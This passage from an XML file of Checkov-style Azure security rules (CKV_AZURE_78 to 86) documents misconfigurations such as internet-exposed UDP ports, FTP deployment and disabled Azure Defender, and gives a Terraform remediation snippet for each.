    <name>Ensure UDP Services are restricted from the Internet</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="udp-services-are-not-restricted-from-the-internet"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-udp-services-are-not-restricted-from-the-internet"></div>UDP Services are not restricted from the Internet</div><a aria-label="Skip link to UDP Services are not restricted from the Internet" class="heading-anchor-icon fa fa-anchor" href="#udp-services-are-not-restricted-from-the-internet"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Disable Internet exposed UDP ports on network security groups. The potential security problem with broadly exposing UDP services over the Internet is that attackers can use DDoS amplification techniques to reflect spoofed UDP traffic from Azure Virtual Machines. The most common types of these attacks use exposed DNS, NTP, SSDP, SNMP, CLDAP and other UDP-based services as amplification source for disrupting services of other machines on the Azure Virtual Network or even attack networked devices outside of Azure.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_network_security_group</li>
<li><strong>Argument:</strong>  protocol</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_network_security_group" "example" {

              security_rule {
                name                       = "test123"
                priority                   = 100
                direction                  = "Inbound"
+               access                     = "Deny"
+               protocol                   = "Udp"
                source_port_range          = "*"
                destination_port_range     = "*"
                source_address_prefix      = "*"
                destination_address_prefix = "*"
              }
                                ...
            }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-udp-services-are-restricted-from-the-internet' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-udp-services-are-restricted-from-the-internet</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-udp-services-are-restricted-from-the-internet' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_78</key>
    <name>Ensure FTP Deployments are disabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-app-services-ftp-deployment-is-all-allowed"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-app-services-ftp-deployment-is-all-allowed"></div>Azure App Services FTP deployment is All allowed</div><a aria-label="Skip link to Azure App Services FTP deployment is All allowed" class="heading-anchor-icon fa fa-anchor" href="#azure-app-services-ftp-deployment-is-all-allowed"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>FTPS (Secure FTP) is used to enhance security for Azure web application using App Service as it adds an extra layer of security to the FTP protocol, and help you to comply with the industry standards and regulations. For enhanced security, it is highly advices to use FTP over TLS/SSL only. You can also disable both FTP and FTPS if you don't use FTP deployment.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> xyz</li>
<li><strong>Argument:</strong> ftps_state - (Optional) State of FTP / FTPS service for this App Service. Possible values include: AllAllowed, FtpsOnly and Disabled.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_app_service" "example" {
  ...
+ ftps_state = "FtpsOnly"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-ftp-deployments-are-disabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-ftp-deployments-are-disabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-ftp-deployments-are-disabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_79</key>
    <name>Ensure Azure Defender is set to On for SQL servers on machines</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-defender-is-set-to-off-for-sql-servers-on-machines"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-defender-is-set-to-off-for-sql-servers-on-machines"></div>Azure Defender is set to Off for SQL servers on machines</div><a aria-label="Skip link to Azure Defender is set to Off for SQL servers on machines" class="heading-anchor-icon fa fa-anchor" href="#azure-defender-is-set-to-off-for-sql-servers-on-machines"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Azure Defender is a cloud workload protection service that utilizes and agent-based deployment to analyze signals from Azure network fabric and the service control plane, to detect threats across all Azure resources. It can also analyze non-Azure resources, utilizing Azure Arc, including those on-premises and in both AWS and GCP (once they've been onboarded). </p>
<p>Azure Defender for SQL servers on machines extends the protections for your Azure-native SQL Servers to fully support hybrid environments and protect SQL servers (all supported version) hosted in Azure.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_security_center_subscription_pricing</li>
<li><strong>Argument:</strong> resource_type - (Required) The resource type this setting affects. Ensure that <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">SqlServers</code> and <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">SqlServerVirtualMachines</code> are declared to pass this check.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_security_center_subscription_pricing" "example" {
  tier          = "Standard"
  resource_type = "AppServices,ContainerRegistry,KeyVaults,KubernetesService,SqlServers,SqlServerVirtualMachines,StorageAccounts,VirtualMachines,ARM,DNS"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-azure-defender-is-set-to-on-for-sql-servers-on-machines' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-azure-defender-is-set-to-on-for-sql-servers-on-machines</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-azure-defender-is-set-to-on-for-sql-servers-on-machines' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_80</key>
    <name>Ensure Azure App Service Web app uses the latest .Net Core version</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-app-service-web-app-doesnt-use-latest-net-framework-version"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-app-service-web-app-doesnt-use-latest-net-framework-version"></div>Azure App Service Web app doesn't use latest .Net framework version</div><a aria-label="Skip link to Azure App Service Web app doesn't use latest .Net framework version" class="heading-anchor-icon fa fa-anchor" href="#azure-app-service-web-app-doesnt-use-latest-net-framework-version"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Azure App Service web applications developed with the .NET software stack should use the latest available version of .NET to ensure the latest security fixes are in use.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_app_service</li>
<li><strong>Argument:</strong> dotnet_framework_version - (Optional) The version of the .net framework's CLR used in this App Service. Possible values are v2.0 (which will use the latest version of the .net framework for the .net CLR v2 - currently .net 3.5), v4.0 (which corresponds to the latest version of the .net CLR v4 - which at the time of writing is .net 4.7.1) and v5.0.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_app_service" "example" {
  ...
  site_config {
+   dotnet_framework_version = "v4.0"
    ...
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-net-framework-version-is-the-latest-if-used-as-a-part-of-the-web-app' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-net-framework-version-is-the-latest-if-used-as-a-part-of-the-web-app</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-net-framework-version-is-the-latest-if-used-as-a-part-of-the-web-app' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_81</key>
    <name>Ensure Azure App Service Web app uses the latest PHP version</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-app-service-web-app-does-not-use-the-latest-php-version"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-app-service-web-app-does-not-use-the-latest-php-version"></div>Azure App Service Web app does not use the latest PHP version</div><a aria-label="Skip link to Azure App Service Web app does not use the latest PHP version" class="heading-anchor-icon fa fa-anchor" href="#azure-app-service-web-app-does-not-use-the-latest-php-version"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Azure App Service web applications developed with the PHP should use the latest available version of PHP to ensure the latest security fixes are in use.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_app_service</li>
<li><strong>Argument:</strong> php_version - (Optional) The version of PHP to use in this App Service. Possible values are 5.5, 5.6, 7.0, 7.1, 7.2, 7.3 and 7.4.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_app_service" "example" {
  ...
+  site_config {
+    php_version = "7.4"
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-php-version-is-the-latest-if-used-to-run-the-web-app' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-php-version-is-the-latest-if-used-to-run-the-web-app</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-php-version-is-the-latest-if-used-to-run-the-web-app' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_82</key>
    <name>Ensure Azure App Service Web app uses the latest Python version</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-app-service-web-app-does-not-use-the-latest-python-version"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-app-service-web-app-does-not-use-the-latest-python-version"></div>Azure App Service Web app does not use the latest Python version </div><a aria-label="Skip link to Azure App Service Web app does not use the latest Python version " class="heading-anchor-icon fa fa-anchor" href="#azure-app-service-web-app-does-not-use-the-latest-python-version"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Azure App Service web applications developed with the Python should use the latest available version of Python to ensure the latest security fixes are in use.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_app_service</li>
<li><strong>Argument:</strong> python_version - (Optional) The version of Python to use in this App Service. Possible values are 2.7 and 3.4.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_app_service" "example" {
   ...
+  site_config {
+   python_version = "3.4"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-python-version-is-the-latest-if-used-to-run-the-web-app' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-python-version-is-the-latest-if-used-to-run-the-web-app</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-python-version-is-the-latest-if-used-to-run-the-web-app' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_83</key>
    <name>Ensure Azure App Service Web app uses the latest Java version</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-app-service-web-app-does-not-use-the-latest-java-version"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-app-service-web-app-does-not-use-the-latest-java-version"></div>Azure App Service Web app does not use the latest Java version</div><a aria-label="Skip link to Azure App Service Web app does not use the latest Java version" class="heading-anchor-icon fa fa-anchor" href="#azure-app-service-web-app-does-not-use-the-latest-java-version"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Azure App Service web applications developed with the Java software stack should use the latest available version of Java to ensure the latest security fixes are in use.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_app_service</li>
<li><strong>Argument:</strong> java_version - (Optional) The version of Java to use. If specified java_container and java_container_version must also be specified. Possible values are 1.7, 1.8 and 11 and their specific versions - except for Java 11 (e.g. 1.7.0_80, 1.8.0_181, 11)</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_app_service" "example" {
  ...
  site_config {
+   java_version = "11"
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-java-version-is-the-latest-if-used-to-run-the-web-app' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-java-version-is-the-latest-if-used-to-run-the-web-app</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-java-version-is-the-latest-if-used-to-run-the-web-app' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_84</key>
    <name>Ensure Azure Security Center Defender is set to On for storage</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-security-center-defender-is-set-to-off-for-storage"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-security-center-defender-is-set-to-off-for-storage"></div>Azure Security Center Defender is set to Off for storage</div><a aria-label="Skip link to Azure Security Center Defender is set to Off for storage" class="heading-anchor-icon fa fa-anchor" href="#azure-security-center-defender-is-set-to-off-for-storage"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Azure Defender is a cloud workload protection service that utilizes and agent-based deployment to analyze signals from Azure network fabric and the service control plane, to detect threats across all Azure resources. It can also analyze non-Azure resources, utilizing Azure Arc, including those on-premises and in both AWS and GCP (once they've been onboarded). </p>
<p>Azure Defender for Storage detects unusual and potentially harmful attempts to access or exploit storage accounts.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_security_center_subscription_pricing</li>
<li><strong>Argument:</strong> resource_type - (Required) The resource type this setting affects. Ensure that <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">StorageAccounts</code> is declared to pass this check.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_security_center_subscription_pricing" "example" {
  tier          = "Standard"
  resource_type = "AppServices,ContainerRegistry,KeyVaults,KubernetesService,SqlServers,SqlServerVirtualMachines,StorageAccounts,VirtualMachines,ARM,DNS"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-azure-defender-is-set-to-on-for-storage' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-azure-defender-is-set-to-on-for-storage</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-azure-defender-is-set-to-on-for-storage' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_85</key>
    <name>Ensure Azure Security Center Defender is set to On for Kubernetes</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-security-center-defender-is-set-to-off-for-kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-security-center-defender-is-set-to-off-for-kubernetes"></div>Azure Security Center Defender is set to Off for Kubernetes</div><a aria-label="Skip link to Azure Security Center Defender is set to Off for Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#azure-security-center-defender-is-set-to-off-for-kubernetes"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Azure Defender is a cloud workload protection service that utilizes and agent-based deployment to analyze signals from Azure network fabric and the service control plane, to detect threats across all Azure resources. It can also analyze non-Azure resources, utilizing Azure Arc, including those on-premises and in both AWS and GCP (once they've been onboarded).<br/>
Azure Defender for Kubernetes provides cluster-level threat protection by monitoring your AKS-managed services through the logs retrieved by Azure Kubernetes Service (AKS).</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_security_center_subscription_pricing</li>
<li><strong>Argument:</strong> resource_type - (Required) The resource type this setting affects. Ensure that <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">KubernetesService</code> is declared to pass this check.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_security_center_subscription_pricing" "example" {
  tier          = "Standard"
  resource_type = "AppServices,ContainerRegistry,KeyVaults,KubernetesService,SqlServers,SqlServerVirtualMachines,StorageAccounts,VirtualMachines,ARM,DNS"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-azure-defender-is-set-to-on-for-kubernetes' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-azure-defender-is-set-to-on-for-kubernetes</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-azure-defender-is-set-to-on-for-kubernetes' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_86</key>
    <name>Ensure Azure Defender is set to On for container registries</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-defender-is-set-to-off-for-container-registries"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-defender-is-set-to-off-for-container-registries"></div>Azure Defender is set to Off for container registries</div><a aria-label="Skip link to Azure Defender is set to Off for container registries" class="heading-anchor-icon fa fa-anchor" href="#azure-defender-is-set-to-off-for-container-registries"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Azure Defender is a cloud workload protection service that utilizes and agent-based deployment to analyze signals from Azure network fabric and the service control plane, to detect threats across all Azure resources. It can also analyze non-Azure resources, utilizing Azure Arc, including those on-premises and in both AWS and GCP (once they've been onboarded).<br/>
Azure Defender for container registries includes a vulnerability scanner to scan the images in Azure Resource Manager-based Azure Container Registry registries and provide deeper visibility image vulnerabilities. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_security_center_subscription_pricing</li>
<li><strong>Argument:</strong> resource_type - (Required) The resource type this setting affects. Ensure that <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">ContainerRegistry</code> is declared to pass this check.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_security_center_subscription_pricing" "example" {
  tier          = "Standard"
  resource_type = "AppServices,ContainerRegistry,KeyVaults,KubernetesService,SqlServers,SqlServerVirtualMachines,StorageAccounts,VirtualMachines,ARM,DNS"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-azure-defender-is-set-to-on-for-container-registries' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-azure-defender-is-set-to-on-for-container-registries</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-azure-defender-is-set-to-on-for-container-registries' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_88</key>
    <name>Ensure app services use Azure files</name>
    <description>
